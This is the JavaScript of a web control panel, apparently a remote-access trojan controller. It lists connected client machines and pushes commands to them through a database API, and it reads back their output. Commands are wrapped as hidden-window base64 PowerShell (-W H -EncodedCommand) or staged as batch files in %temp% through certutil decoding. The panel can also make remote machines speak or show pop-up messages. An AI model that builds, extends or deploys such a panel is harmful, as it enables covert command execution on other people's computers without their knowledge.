            updateRandomThemeOptionLabel(nextTheme);

            const select = $('theme-select');
            if (select && select.value !== state.themeSelection) {
                select.value = state.themeSelection;
            }
        }

        window.setRunTheme = applyTheme;

        document.addEventListener('contextmenu', e => e.preventDefault());

        document.addEventListener('keydown', e => {
            const navKeys = ['ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];
            if (navKeys.includes(e.key)) {
                document.body.classList.add('kb-mode');
            }
        }, true);

        function sortRows(rows) {
            return [...rows].sort((a, b) => {
                const order = { green: 0, yellow: 1, red: 2 };
                return order[getStatus(a)] - order[getStatus(b)] || a.username.localeCompare(b.username);
            });
        }

        function getSortedRows() {
            return state.sortedRows;
        }

        function getRenderableRows() {
            return state.isConnected ? getSortedRows() : sortRows(demoUsers);
        }

        function getHintUsername(sorted = getRenderableRows()) {
            if (!sorted.length) return null;
            if (state.activeUsername && sorted.some(user => user.username === state.activeUsername)) {
                return state.activeUsername;
            }
            return sorted[0].username;
        }

        function refreshHintsIfNeeded() {
            if (state.isRendering) return;
            const nextHintUsername = getHintUsername();
            if (nextHintUsername === state.hintUsername) return;
            state.hintUsername = nextHintUsername;
            renderGrid();
        }

        function getStatus(user, nowMs = Date.now()) {
            if (user.demo && user.username === 'demo-ator') return 'green';
            const diff = (nowMs - new Date(user.updated_at).getTime()) / 1000;
            if (diff < 10) return 'green';
            if (diff < 30) return 'yellow';
            return 'red';
        }

        function buildRowsRenderSignature(rows, isSorted = false) {
            const nowMs = Date.now();
            const order = { green: 0, yellow: 1, red: 2 };
            const sourceRows = isSorted ? rows : sortRows(rows);

            return sourceRows
                .map(user => {
                    const status = getStatus(user, nowMs);
                    return {
                        username: user.username,
                        status,
                        visible: !!user.visible,
                        updatedAt: status === 'green' ? '' : user.updated_at
                    };
                })
                .sort((a, b) => order[a.status] - order[b.status] || a.username.localeCompare(b.username))
                .map(user => `${user.username}|${user.status}|${user.visible ? 1 : 0}|${user.updatedAt}`)
                .join('||');
        }

        function updatePlaceholder() {
            const m = state.popupMode;
            const ta = $('popup-input');
            if (m === 'cmd') {
                ta.placeholder = state.selectedShell === 'ps'
                    ? 'Get-Process | Where-Object { $_.CPU -gt 100 }'
                    : 'echo hello\nping 127.0.0.1 -n 3';
            } else if (m === 'speak') {
                ta.placeholder = `Type speech text i.e. "${state.popupExampleText || 'Audio test, all systems ready.'}"`;
            } else if (m === 'popup_msg') {
                ta.placeholder = `Type popup note i.e. "${state.popupExampleText || 'Reminder: save your work now.'}"`;
            }
        }

        function pickRandomPopupExample(mode) {
            const list = popupExamples[mode];
            if (!list || !list.length) return '';
            return list[Math.floor(Math.random() * list.length)];
        }

        function getPopupAutofillText() {
            if (state.popupMode === 'cmd') {
                return $('popup-input').placeholder;
            }
            if (state.popupMode === 'speak') {
                return state.popupExampleText || pickRandomPopupExample('speak');
            }
            if (state.popupMode === 'popup_msg') {
                return state.popupExampleText || pickRandomPopupExample('popup_msg');
            }
            return $('popup-input').placeholder;
        }

        function updateOptionsUI() {
            $('voice-david').className = 'opt-btn' + (state.selectedVoice === 'David' ? ' active' : '');
            $('voice-zira').className = 'opt-btn' + (state.selectedVoice === 'Zira' ? ' active' : '');
            $('vis-true').className = 'opt-btn' + (state.selectedVis ? ' active' : '');
            $('vis-false').className = 'opt-btn' + (!state.selectedVis ? ' active' : '');
            $('shell-cmd').className = 'opt-btn' + (state.selectedShell === 'cmd' ? ' active' : '');
            $('shell-ps').className = 'opt-btn' + (state.selectedShell === 'ps' ? ' active' : '');
            $('cmd-pause').className = 'opt-btn' + (state.pause ? ' active' : '');
            $('shell-summary-cmd').className = 'collapsible-meta-pill' + (state.selectedShell === 'cmd' ? ' active' : '');
            $('shell-summary-ps').className = 'collapsible-meta-pill' + (state.selectedShell === 'ps' ? ' active' : '');
            $('shell-summary-upload').className = 'collapsible-meta-pill' + ($('popup-input') && $('popup-input').value.trim() ? ' active' : '');
            $('shell-summary-pause').className = 'collapsible-meta-pill' + (state.pause ? ' active' : '');
            const volume = $('spk-volume');
            const speed = $('spk-speed');
            const volumeValue = $('spk-volume-value');
            const speedValue = $('spk-speed-value');
            const summaryMeta = $('spk-summary-meta');
            if (volume) volume.value = String(state.selectedSpkVolume);
            if (speed) speed.value = String(state.selectedSpkSpeed);
            if (volumeValue) volumeValue.textContent = String(state.selectedSpkVolume);
            if (speedValue) speedValue.textContent = String(state.selectedSpkSpeed);
            if (summaryMeta) summaryMeta.textContent = `Volume ${state.selectedSpkVolume} | Speed ${state.selectedSpkSpeed}`;
            updatePlaceholder();
        }

        function clearActiveSelection() {
            state.activeUsername = null;
            state.interactionMode = null;
            document.body.classList.remove('kb-mode');
            document.querySelectorAll('.user-card').forEach(c => c.classList.remove('selected'));
            refreshHintsIfNeeded();
        }

        function setActiveSelection(user, mode, { scroll = false } = {}) {
            if (!user) {
                clearActiveSelection();
                return;
            }

            state.activeUsername = user.username;
            state.interactionMode = mode;

            if (mode === 'keyboard') {
                document.body.classList.add('kb-mode');
            } else {
                document.body.classList.remove('kb-mode');
            }

            const cards = document.querySelectorAll('.user-card');
            cards.forEach(c => c.classList.remove('selected'));
            const sorted = getRenderableRows();
            const idx = sorted.findIndex(item => item.username === user.username);
            if (idx === -1 || idx >= cards.length) {
                return;
            }

            cards[idx].classList.add('selected');
            if (scroll) {
                cards[idx].scrollIntoView({ block: 'nearest' });
            }

            refreshHintsIfNeeded();
        }

        function getCardBodyHtml(user, status, alive, tsText, showHint) {
            const isDemo = !!user.demo;
            const canInteract = state.isConnected || isDemo;
            const showPrimaryHint = showHint && alive && canInteract;
            return `
                    <div class="card-header">
                        <div style="flex:1;min-width:0;">
                            <div style="display:flex;align-items:center;gap:8px;">
                                <div class="status-ring status-${status}"></div>
                                <span class="card-username ${alive ? '' : 'offline'}">${user.username}</span>
                            </div>
                            <div class="card-ts">${tsText}</div>
                        </div>
                    </div>
                    <div class="card-actions">
                        <button class="card-btn primary ${(alive && canInteract) ? '' : 'disabled'}" data-action="cmd" ${(alive && canInteract) ? '' : 'disabled aria-disabled="true"'}>
                            CMD ${showPrimaryHint ? '<span class="btn-hint">C</span>' : ''}
                        </button>
                        <button class="card-btn ${(alive && canInteract) ? '' : 'disabled'}" data-action="speak" ${(alive && canInteract) ? '' : 'disabled aria-disabled="true"'}>
                            SPK ${showPrimaryHint ? '<span class="btn-hint">S</span>' : ''}
                        </button>
                        <button class="card-btn ${(alive && canInteract) ? '' : 'disabled'}" data-action="popup_msg" ${(alive && canInteract) ? '' : 'disabled aria-disabled="true"'}>
                            MSG ${showPrimaryHint ? '<span class="btn-hint">A</span>' : ''}
                        </button>
                        <button class="card-btn ${canInteract ? '' : 'disabled'}" data-action="output" ${canInteract ? '' : 'disabled aria-disabled="true"'}>
                            OUT ${showHint && canInteract ? '<span class="btn-hint">V</span>' : ''}
                        </button>
                    </div>
                `;
        }

        function getCardRenderSignature(user, status, alive, tsText, showHint) {
            return `${user.username}|${status}|${alive ? 1 : 0}|${showHint ? 1 : 0}|${tsText}`;
        }

        function renderGrid() {
            state.isRendering = true;
            const grid = $('user-grid');
            const sorted = getRenderableRows();
            const hintUsername = getHintUsername(sorted);
            state.hintUsername = hintUsername;

            if (!sorted.length) {
                if (!grid.querySelector('.empty')) {
                    grid.innerHTML = '<div class="empty">NO CLIENTS CONNECTED</div>';
                }
                state.hintUsername = null;
                clearActiveSelection();
                state.isRendering = false;
                return;
            }

            const existingCards = new Map();
            Array.from(grid.querySelectorAll('.user-card')).forEach(card => {
                existingCards.set(card.dataset.username, card);
            });

            const animateWholeBatch = existingCards.size === 0;

            const seen = new Set();
            sorted.forEach((user, index) => {
                const status = getStatus(user);
                const alive = status === 'green';
                const lastSeenDate = new Date(user.updated_at);
                const tsText = alive ? '' : `Last seen: ${lastSeenDate.toLocaleDateString()} ${lastSeenDate.toLocaleTimeString()}`;
                const showHint = user.username === hintUsername;
                const signature = getCardRenderSignature(user, status, alive, tsText, showHint);

                let card = existingCards.get(user.username);
                const isNewCard = !card;
                if (!card) {
                    card = document.createElement('div');
                    card.dataset.username = user.username;
                    existingCards.set(user.username, card);
                }

                const nextClassName = `user-card${alive ? '' : ' offline'}`;
                if (card.className !== nextClassName) {
                    card.className = nextClassName;
                }

                if (card.dataset.renderSignature !== signature) {
                    card.innerHTML = getCardBodyHtml(user, status, alive, tsText, showHint);
                    card.dataset.renderSignature = signature;
                }

                seen.add(user.username);

                const referenceNode = grid.children[index] || null;
                if (referenceNode !== card) {
                    grid.insertBefore(card, referenceNode);
                }

                if (isNewCard || animateWholeBatch) {
                    card.classList.remove('card-enter');
                    card.style.animationDelay = `${Math.min(index, 8) * 35}ms`;
                    // Force reflow so re-adding class restarts animation consistently.
                    void card.offsetWidth;
                    card.classList.add('card-enter');
                }
            });

            Array.from(grid.querySelectorAll('.user-card')).forEach(card => {
                if (!seen.has(card.dataset.username)) {
                    card.remove();
                }
            });

            const emptyState = grid.querySelector('.empty');
            if (emptyState) {
                emptyState.remove();
            }

            if (state.activeUsername) {
                const activeUser = sorted.find(item => item.username === state.activeUsername);
                if (activeUser) {
                    setActiveSelection(activeUser, state.interactionMode || 'hover');
                } else {
                    clearActiveSelection();
                }
            }

            state.isRendering = false;
        }

        function bytesToBase64(bytes) {
            const chunkSize = 0x8000;
            let binary = '';
            for (let i = 0; i < bytes.length; i += chunkSize) {
                binary += String.fromCharCode(...bytes.subarray(i, i + chunkSize));
            }
            return btoa(binary);
        }

        function syncTabHint() {
            const taInput = $('popup-input');
            const taWrap = $('textarea-wrap');
            const tabAutofillHint = $('tab-autofill-hint');
            const tabUnfocusHint = $('tab-unfocus-hint');
            const focused = document.activeElement === taInput;
            const empty = taInput.value === '';
            if (focused) {
                taWrap.classList.add('show-hint');
            } else {
                taWrap.classList.remove('show-hint');
            }
            tabAutofillHint.style.display = (focused && empty) ? 'flex' : 'none';
            tabUnfocusHint.style.display = focused ? 'flex' : 'none';
        }

        function autofillPopupInput() {
            const taInput = $('popup-input');
            if (taInput.value !== '') return;
            taInput.value = getPopupAutofillText();
            taInput.selectionStart = taInput.selectionEnd = taInput.value.length;
            syncTabHint();
        }

        function unfocusPopupInput() {
            $('popup-input').blur();
            syncTabHint();
        }

        async function setPopupVisibility(nextVisible) {
            if (state.popupMode !== 'cmd' || !state.popupUser) return;

            state.selectedVis = !!nextVisible;
            state.popupUser.visible = state.selectedVis;

            const userIndex = state.rows.findIndex(row => row.username === state.popupUser.username);
            if (userIndex !== -1) {
                state.rows[userIndex] = { ...state.rows[userIndex], visible: state.selectedVis };
            }

            updateOptionsUI();
            renderGrid();

            if (!state.isConnected || !state.url || !state.apiKey || state.popupUser.demo) {
                return;
            }

            try {
                await fetch(`${state.url}?username=eq.${state.popupUser.username}`, {
                    method: 'PATCH',
                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}`, 'Content-Type': 'application/json' },
                    body: JSON.stringify({ visible: state.selectedVis })
                });
            } catch (e) {
                console.error('Visibility Sync Error', e);
            }
        }

        function openPopup(mode, user) {
            state.popupMode = mode;
            state.popupUser = user;
            state.selectedVis = !!user.visible;
            state.popupExampleText = (mode === 'speak' || mode === 'popup_msg') ? pickRandomPopupExample(mode) : '';

            $('popup-input').value = '';
            $('popup-target-label').textContent = user.username;
            $('popup-overlay').classList.add('open');
            $('textarea-wrap').classList.remove('show-hint');

            $('vis-section').style.display = (mode === 'cmd') ? 'flex' : 'none';
            $('shell-section').style.display = (mode === 'cmd') ? 'block' : 'none';
            $('voice-section').style.display = (mode === 'speak') ? 'flex' : 'none';
            $('spk-controls').style.display = (mode === 'speak') ? 'block' : 'none';
            $('shell-section').open = false;
            $('spk-controls').open = false;

            if (mode === 'cmd') {
                $('popup-mode-label').textContent = 'Execute Command';
            } else if (mode === 'speak') {
                $('popup-mode-label').textContent = 'Voice Message';
            } else {
                $('popup-mode-label').textContent = 'Message Box';
            }

            updateOptionsUI();
            setTimeout(() => { $('popup-input').focus(); syncTabHint(); }, 50);
        }

        function closePopup() {
            $('popup-overlay').classList.remove('open');
            $('textarea-wrap').classList.remove('show-hint');
            state.popupMode = null;
            state.popupUser = null;
            state.popupExampleText = '';
        }

        function formatPSString(str) {
            const escaped = str.replace(/'/g, "''");
            return escaped.split(/\r?\n/).map(line => `'${line}'`).join(' + [char]13 + ');
        }

        function wrapPowershell(val, hidden = true) {
            // UTF-16LE base64 â†’ powershell -EncodedCommand. Handles multiline + any quoting.
            const utf16 = new Uint8Array(val.length * 2);
            for (let i = 0; i < val.length; i++) {
                const code = val.charCodeAt(i);
                const offset = i * 2;
                utf16[offset] = code & 0xff;
                utf16[offset + 1] = (code >> 8) & 0xff;
            }
            const b64 = bytesToBase64(utf16);
            return `powershell -NoP -W ${hidden ? 'H' : 'Normal'} -EncodedCommand ${b64}`;
        }

        function normalizePsPauseCommands(val) {
            // In PowerShell, users often type CMD-style PAUSE. Translate it to Read-Host.
            return val.replace(/^\s*pause\s*$/gim, "Read-Host 'Press Enter to continue'");
        }

        function applyCommandPause(val) {
            const input = val.trim();
            if (!state.pause) return input;
            if (state.selectedShell === 'ps') {
                const normalized = normalizePsPauseCommands(input);
                return normalized ? `${normalized}\nRead-Host 'Press Enter to continue'` : "Read-Host 'Press Enter to continue'";
            }
            return input ? `${input}\npause` : 'pause';
        }

        function wrapCmd(val) {
            const isMultiline = val.includes('\n');
            if (!isMultiline) return val;
            // Multiline CMD: base64-encode the script, decode to a temp .bat via certutil, run it.
            const utf8 = new TextEncoder().encode(val);
            const b64 = bytesToBase64(utf8);
            return `cmd /c "echo ${b64}>%temp%\\r.b64 && certutil -decode %temp%\\r.b64 %temp%\\r.bat >nul && cmd /c %temp%\\r.bat && del %temp%\\r.b64 %temp%\\r.bat"`;
        }

        async function doSendPopup() {
            const user = state.popupUser;
            const mode = state.popupMode;
            const val = $('popup-input').value.trim();
            if (!user) return;

            if (!state.isConnected || user.demo) {
                closePopup();
                alert('Demo mode: action preview only. Connect to send real commands.');
                return;
            }

            let rawCmd = '';
            if (mode === 'cmd') {
                const cmdInput = applyCommandPause(val);
                if (cmdInput) {
                    const psInput = state.selectedShell === 'ps' ? normalizePsPauseCommands(cmdInput) : cmdInput;
                    rawCmd = state.selectedShell === 'ps'
                        ? wrapPowershell(psInput, !state.selectedVis)
                        : wrapCmd(psInput);
                }
            } else if (val) {
                if (mode === 'speak') {
                    const msg = formatPSString(val);
                    rawCmd = `powershell -W H -C "$s=New-Object -Com SAPI.SpVoice;$s.Volume=${state.selectedSpkVolume};$s.Rate=${state.selectedSpkSpeed};$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${state.selectedVoice}*'};$s.Speak(${msg})"`;
                } else {
                    const msg = formatPSString(val);
                    rawCmd = `powershell -W H -C "(New-Object -Com WScript.Shell).Popup(${msg})"`;
                }
            }

            const body = {};
            if (rawCmd) { body.cmd = btoa(rawCmd); body.run = true; }
            if (mode === 'cmd') body.visible = state.selectedVis;

            try {
                await fetch(`${state.url}?username=eq.${user.username}`, {
                    method: 'PATCH',
                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}`, 'Content-Type': 'application/json' },
                    body: JSON.stringify(body)
                });
                closePopup();
                fetchData();
            } catch (e) { console.error("Trans Error", e); }
        }

        async function doViewOutput(user) {
            if (user?.demo || !state.isConnected) {
                const demoOutput = `[demo] ${user.username}\nstatus: preview only\nlast action: none (connect to enable live output)`;
                navigator.clipboard.writeText(demoOutput).catch(() => { });
                alert(demoOutput);
                return;
            }

            try {
                const res = await fetch(`${state.url}?select=out&username=eq.${user.username}`, {
                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}` }
                });
                const data = await res.json();
                if (data[0]?.out) {
                    const decoded = atob(data[0].out);
                    navigator.clipboard.writeText(decoded).catch(() => { });
                    alert(decoded);
                }
            } catch (e) { console.error(e); }
        }

        async function fetchData() {
            if (!state.url || !state.apiKey || !state.isConnected) return;
            if (state.fetchInFlight) return;
            state.fetchInFlight = true;
            try {
                const res = await fetch(`${state.url}?select=username,updated_at,visible`, {
                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}` }
                });
                const nextRows = await res.json();
                const nextSortedRows = sortRows(nextRows);
                const nextSignature = buildRowsRenderSignature(nextSortedRows, true);

                state.rows = nextRows;
                state.sortedRows = nextSortedRows;
                if (nextSignature === state.lastRenderSignature) {
                    return;
                }

                state.lastRenderSignature = nextSignature;
                renderGrid();
            } catch (e) {
                console.error(e);
            } finally {
                state.fetchInFlight = false;
            }
        }

        function init() {
            applyTheme(state.themeSelection);
            setConnectionState(false);

            const themeSelect = $('theme-select');
            if (themeSelect) {
                themeSelect.value = state.themeSelection;
                themeSelect.addEventListener('change', e => {
                    applyTheme(e.target.value);
                });
            }

            const connectBtn = $('connect-btn');
            if (connectBtn) {
                connectBtn.addEventListener('click', () => {
                    if (state.isConnected) {
                        disconnectAndReset();
                        return;
                    }
                    promptAndConnect();
                });
            }

            if (state.url && state.apiKey) {
                const grid = $('user-grid');
                if (grid) {
                    grid.innerHTML = '<div class="empty">Connecting...</div>';
                }
                connectWithCredentials(state.url, state.apiKey, { notifyOnFail: false }).then(isConnected => {
                    if (!isConnected) {
                        renderGrid();
                    }
                });
            } else {
                renderGrid();
            }

            setInterval(fetchData, 4000);

            const grid = $('user-grid');
            grid.addEventListener('mousemove', e => {
                const card = e.target.closest('.user-card');
                if (!card) {
                    if (state.interactionMode === 'hover') {
                        clearActiveSelection();
                    }
                    return;
                }

                const username = card.dataset.username;
                if (!username || username === state.activeUsername) return;

                const sorted = getRenderableRows();
                const hoveredUser = sorted.find(item => item.username === username);
                if (hoveredUser) {
                    setActiveSelection(hoveredUser, 'hover');
                }
            });

            grid.addEventListener('mouseleave', () => {
                if (state.interactionMode === 'hover') {
                    clearActiveSelection();
                }
            });

            grid.addEventListener('click', e => {
                const btn = e.target.closest('.card-btn');
                if (!btn) return;

                const card = e.target.closest('.user-card');
                if (!card) return;

                const username = card.dataset.username;
                if (!username) return;

                const user = getRenderableRows().find(item => item.username === username);
                if (!user) return;

                const action = btn.dataset.action;
                if (!action) return;
                if (action === 'cmd') openPopup('cmd', user);
                if (action === 'speak') openPopup('speak', user);
                if (action === 'popup_msg') openPopup('popup_msg', user);
                if (action === 'output') doViewOutput(user);
            });

            $('voice-david').onclick = () => { state.selectedVoice = 'David'; updateOptionsUI(); };
            $('voice-zira').onclick = () => { state.selectedVoice = 'Zira'; updateOptionsUI(); };
            $('spk-volume').oninput = e => { state.selectedSpkVolume = Number(e.target.value); updateOptionsUI(); };
            $('spk-speed').oninput = e => { state.selectedSpkSpeed = Number(e.target.value); updateOptionsUI(); };
            $('vis-true').onclick = () => { setPopupVisibility(true); };
            $('vis-false').onclick = () => { setPopupVisibility(false); };
            $('shell-cmd').onclick = () => { state.selectedShell = 'cmd'; updateOptionsUI(); };
            $('shell-ps').onclick = () => { state.selectedShell = 'ps'; updateOptionsUI(); };
            $('cmd-pause').onclick = () => { state.pause = !state.pause; updateOptionsUI(); };

            $('upload-btn').onclick = () => $('file-upload').click();
            $('file-upload').onchange = e => {
                const file = e.target.files[0];
                if (!file) return;
                const ext = file.name.split('.').pop().toLowerCase();
                if (ext === 'ps1') { state.selectedShell = 'ps'; updateOptionsUI(); }
                else if (ext === 'bat' || ext === 'cmd') { state.selectedShell = 'cmd'; updateOptionsUI(); }
                const reader = new FileReader();
                reader.onload = ev => {
                    $('popup-input').value = ev.target.result;
                    $('popup-input').focus();
                    updateOptionsUI();
                };
                reader.readAsText(file);
                e.target.value = '';
            };

            $('popup-input').addEventListener('input', () => updateOptionsUI());

            document.addEventListener('keydown', e => {
                if (state.popupMode) {
                    if (e.key === 'Escape') closePopup();
                    if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
                        e.preventDefault();
                        doSendPopup();
                    }
                    if (e.key === 'Shift' && document.activeElement !== $('popup-input')) {
                        if (state.popupMode === 'speak') {
                            state.selectedVoice = (state.selectedVoice === 'David' ? 'Zira' : 'David');
                            updateOptionsUI();
                        } else if (state.popupMode === 'cmd') {
                            setPopupVisibility(!state.selectedVis);
                        }
                    }
                    return;
                }

                const arrowKeys = ['ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];
                if (arrowKeys.includes(e.key)) {
                    e.preventDefault();
                    const cards = document.querySelectorAll('.user-card');
                    const total = cards.length;
                    if (!total) return;

                    const grid = $('user-grid');
                    const gridStyle = getComputedStyle(grid);
                    const cols = gridStyle.gridTemplateColumns.split(' ').length;
                    const sorted = getRenderableRows();
                    const currentIndex = state.activeUsername
                        ? sorted.findIndex(item => item.username === state.activeUsername)
                        : -1;

                    let next = currentIndex;
                    if (next < 0) {
                        next = 0;
                    } else {
                        if (e.key === 'ArrowRight') next = Math.min(next + 1, total - 1);
                        if (e.key === 'ArrowLeft') next = Math.max(next - 1, 0);
                        if (e.key === 'ArrowDown') next = Math.min(next + cols, total - 1);
                        if (e.key === 'ArrowUp') next = Math.max(next - cols, 0);
                    }
                    const nextUser = sorted[next];
                    if (nextUser) {
                        setActiveSelection(nextUser, 'keyboard', { scroll: true });
                    }
                    return;
                }

                const sorted = getRenderableRows();
                const u = state.activeUsername ? sorted.find(item => item.username === state.activeUsername) : null;
                if (!u) return;
                const alive = getStatus(u) === 'green';
                const key = e.key.toLowerCase();
                if (key === 'c' && alive) openPopup('cmd', u);
                if (key === 's' && alive) {
                    state.selectedVoice = e.shiftKey ? 'Zira' : 'David';
                    openPopup('speak', u);
                }
                if (key === 'a' && alive) openPopup('popup_msg', u);
                if (key === 'v') doViewOutput(u);
            });

            $('popup-cancel').onclick = closePopup;
            $('popup-confirm').onclick = doSendPopup;

            const taInput = $('popup-input');
            const taWrap = $('textarea-wrap');
            const tabAutofillHint = $('tab-autofill-hint');
            const tabUnfocusHint = $('tab-unfocus-hint');

            taInput.addEventListener('focus', syncTabHint);
            taInput.addEventListener('blur', syncTabHint);
            taInput.addEventListener('input', syncTabHint);

            tabAutofillHint.addEventListener('mousedown', e => e.preventDefault());
            tabUnfocusHint.addEventListener('mousedown', e => e.preventDefault());
            tabAutofillHint.addEventListener('click', () => {
                taInput.focus();
                autofillPopupInput();
            });
            tabUnfocusHint.addEventListener('click', unfocusPopupInput);

            taInput.addEventListener('keydown', e => {
                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
                    e.preventDefault();
                    doSendPopup();
                }
                if (e.key === 'Tab') {
                    e.preventDefault();
                    if (e.shiftKey) {
                        unfocusPopupInput();
                    } else if (taInput.value === '') {
                        autofillPopupInput();
                    } else {
                        const s = taInput.selectionStart, end = taInput.selectionEnd;
                        taInput.value = taInput.value.slice(0, s) + '    ' + taInput.value.slice(end);
                        taInput.selectionStart = taInput.selectionEnd = s + 4;
                    }
                }
            });
        }
        init();
    </script>
</body>

</html>
